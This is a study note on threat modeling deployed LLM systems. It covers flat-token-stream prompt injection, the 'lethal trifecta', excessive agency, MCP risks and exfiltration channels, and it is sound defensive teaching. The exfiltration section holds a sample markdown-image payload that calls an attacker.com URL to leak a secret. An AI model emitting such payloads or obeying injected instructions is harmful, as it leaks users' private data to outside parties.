---
tags: [concept, domain/safety-interp, level/surface]
aliases: [LLM attack surface, lethal trifecta]
summary: "Mapping the attack surface of a deployed LLM system: trust boundaries, exfiltration channels, and why agency multiplies risk."
---
> **One-paragraph hook:** Before picking a defense you need a map of what's attackable. For LLM systems that map differs from classical application security because the "parser" is a model that handles every token the same way, trusted or not. This note orients the security side of the domain by listing the attack surface and the trust boundaries a real deployment has to reason about. Each individual attack's mechanism has its own note ([[Concept - Prompt Injection]], [[Concept - Data Poisoning and Backdoors]]), and agent sandboxing practice belongs to domain 10 ([[Gotchas - Agents in Production]]).

## The mechanism

Start from the OWASP Top 10 for LLM Applications (2025 revision), the nearest thing the field has to a standard threat checklist: LLM01 Prompt Injection, sensitive-information disclosure, supply-chain vulnerabilities, data/model poisoning, improper output handling, excessive agency, system-prompt leakage, vector/embedding weaknesses, misinformation, and unbounded resource consumption. It's a good list, and almost every item on it traces back to one architectural fact.

**The model sees the system prompt, the user's turn, retrieved documents and tool outputs as one flat token stream.** Nothing in the transformer's input marks which span is a trusted developer instruction and which is untrusted content picked up mid-task. That's the root cause of [[Concept - Prompt Injection]]: there's no instruction/data separation to block an attacker, because the architecture never had one to enforce. Classical application security has SQL parameters vs. SQL text, or code vs. data segments in memory. LLM applications, by default, have neither.

Simon Willison's **lethal trifecta** (2023) is the sharpest operational statement of when this becomes exploitable. A system is exploitable by construction when it combines **(1)** access to private data, **(2)** exposure to untrusted content, and **(3)** a channel to get data out. Remove any one leg and the same injected instruction gets far less dangerous. No private data, nothing worth stealing. No untrusted content, no injection vector. No exfil channel, and a successful injection can't get results out even when it fires. Threat modeling an LLM system mostly comes down to finding every place all three legs are present at once.

**Exfiltration channels** deserve an explicit list, because teams overlook them most. Markdown image rendering: a model asked to render `![](https://attacker.com/log?data=SECRET)` makes the client auto-fetch that URL and leak `SECRET` in the query string, no click needed. Hyperlinks the user might click. Unaudited tool calls that write somewhere the attacker can see. DNS lookups triggered by rendered content. Each has to be found and blocked on its own; blocking one doesn't block the others.

## In practice

**Agency multiplies the blast radius.** A plain chat interface with no tools has a narrow worst case: the model says something bad. Add [[Concept - Tool Use and Function Calling|tool use]], code execution or [[Concept - Retrieval-Augmented Generation|RAG]] and the worst case is the model *doing* something bad, like sending an email, deleting a file or moving money. **Excessive agency**, meaning broad tool scope with no human gate on side-effecting actions, turns a successful injection from an embarrassing output into a consequential action. That's why [[Deep Dive - The Agent Loop]] and agentic systems count as a materially higher-risk deployment class than single-turn chat, and why [[Gotchas - Agents in Production]] is its own subsystem-level catalog.

Two reference frames help when scoping a threat model. **MITRE ATLAS** is the adversarial-ML analogue of the ATT&CK matrix and catalogs adversary tactics and techniques against ML systems (reconnaissance, ML supply chain compromise, model evasion, exfiltration). A **CIA-triad adaptation** for LLMs maps integrity to data/model poisoning, confidentiality to extraction and leakage (system-prompt leaks, training-data extraction), and availability to resource exhaustion (sponge prompts built to maximize inference cost or latency).

One example worth remembering: [[Concept - Model Context Protocol (MCP)]] servers are a fast-growing case of the lethal trifecta by default. An MCP tool that reads a user's inbox (private data), sees arbitrary email content (untrusted content), and can also send email or hit arbitrary URLs (exfil channel) completes all three legs as soon as it's wired up, with no extra attacker effort. So threat modeling an MCP integration means checking whether any combination of tools completes the trifecta, not whether any one tool looks dangerous by itself.

## Failure modes

- **Modeling outputs instead of actions.** Teams default to "can the model be made to say something bad?" and build a content filter. The boundary that matters is "can the model be made to *take a consequential action*?", and a content filter does nothing to stop an injected instruction from calling a tool. Detection: list every side-effecting tool/API the model can reach and ask whether an untrusted-content path leads to it, regardless of what the text output looks like.
- **Assuming one control covers every exfiltration channel.** Blocking markdown image auto-render doesn't block a malicious hyperlink or a DNS-based leak. Detection: walk the exfil-channel list per deployment instead of relying on a single "output sanitizer."
- **Under-scoping the trust boundary at design time and finding out during an incident.** Code often treats retrieved documents and tool outputs as "part of the prompt" even when the threat model implicitly assumed they were trusted. Detection: audit where retrieved/tool content enters the context and confirm it's handled as untrusted at every downstream step, as well as at ingestion.

## The non-obvious

Bigger tool surfaces and richer retrieval usually get pitched as capability wins. For threat modeling they're the same lever as attack-surface expansion, and with current architectures you can't get one without the other. So the threat model isn't a one-time launch exercise. Re-run it every time you add a tool, a data source or broader retrieval scope, because each addition is a candidate new leg of the lethal trifecta.

## Connections
- [[Concept - Prompt Injection]] — the canonical attack that exploits the flat-token-stream root cause described here.
- [[Concept - Data Poisoning and Backdoors]] — the supply-chain / data-integrity leg of the OWASP taxonomy, attacking training rather than inference time.
- [[Gotchas - Agents in Production]] — the accumulated pitfalls of exactly the agency-multiplies-risk dynamic described above.
- [[Deep Dive - The Agent Loop]] — the architecture whose tool-calling step is where excessive agency becomes exploitable.
- [[Concept - Enterprise AI Security Exposure]] — the organizational/deployment-level view of this same risk surface, one level up from the technical mechanism.
- [[Concept - Model Context Protocol (MCP)]] — a concrete, fast-growing case where the lethal trifecta assembles itself by default.
- [[Decision - Defending Against Prompt Injection]] — where this threat model turns into an actual defense-selection decision.
- [[Reference - Jailbreak and Prompt Injection Attack Catalog]] — the enumerable, date-stamped catalog of specific attacks that instantiate this threat surface.
- [[Concept - Retrieval-Augmented Generation]] — a deliberate design that pulls untrusted content into the trusted context, widening exactly the attack surface this note maps.

## Sources
- OWASP (2025) — "OWASP Top 10 for LLM Applications." Standard enumeration of the LLM application attack surface referenced above.
- Willison, S. (2023) — the "lethal trifecta" framing (private data + untrusted content + exfiltration path).
- MITRE ATLAS — adversarial-ML tactics/techniques matrix, the ATT&CK analogue for ML systems.
